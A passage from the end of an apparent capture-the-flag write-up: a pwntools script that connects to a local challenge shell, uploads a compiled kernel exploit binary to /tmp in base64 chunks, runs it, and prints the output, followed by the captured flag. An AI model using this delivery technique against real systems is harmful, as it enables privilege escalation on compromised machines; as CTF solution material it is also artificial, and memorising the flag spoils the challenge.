def upload(r, local_path, remote_path):
    with open(local_path, "rb") as f:
        data = f.read()
    compressed = gzip.compress(data, compresslevel=9)
    b64 = base64.b64encode(compressed).decode()
    log.info(f"Upload: {len(data)}B -> {len(compressed)}B gz -> {len(b64)}B b64")

    chunk_size = 960
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    log.info(f"Sending {len(chunks)} chunks...")

    r.sendline(b"cat /dev/null > /tmp/b64")
    sleep(0.1)

    for i, chunk in enumerate(chunks):
        r.sendline(f"echo -n '{chunk}'>>/tmp/b64".encode())
        sleep(0.005)
        if i % 100 == 0 and i > 0:
            r.sendline(b"echo SYNC")
            try:
                r.recvuntil(b"SYNC\n", timeout=10)
            except:
                r.recvuntil(b"$ ", timeout=5)
            log.info(f"  {i}/{len(chunks)}")

    r.sendline(b"echo ALLDONE")
    r.recvuntil(b"ALLDONE", timeout=30)
    log.info("All chunks sent")

    r.sendline(b"base64 -d /tmp/b64 > /tmp/e.gz && gzip -d /tmp/e.gz && mv /tmp/e "
               + remote_path.encode() + b" && chmod +x " + remote_path.encode()
               + b" && echo DECOK || echo DECFAIL")
    resp = r.recvuntil([b"DECOK", b"DECFAIL"], timeout=20)
    if b"DECFAIL" in resp:
        log.error("Decode failed!")
        return False
    log.success("Decode OK")
    return True


if not os.path.exists(EXPLOIT):
    log.error("Compile first: musl-gcc -static -Os -s -o exploit exploit.c")
    sys.exit(1)

r = remote("localhost", 1337)

log.info("Waiting for shell...")
r.recvuntil(b"$ ", timeout=30)
log.success("Got shell")

r.sendline(b"echo READY")
r.recvuntil(b"READY", timeout=10)

if not upload(r, EXPLOIT, "/tmp/exploit"):
    r.close()
    sys.exit(1)

log.info("Running exploit...")
r.sendline(b"/tmp/exploit")

try:
    while True:
        data = r.recv(timeout=10)
        if not data:
            break
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()
except EOFError:
    pass

r.close()
```

</details>

---

## Flag

```
0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}
```
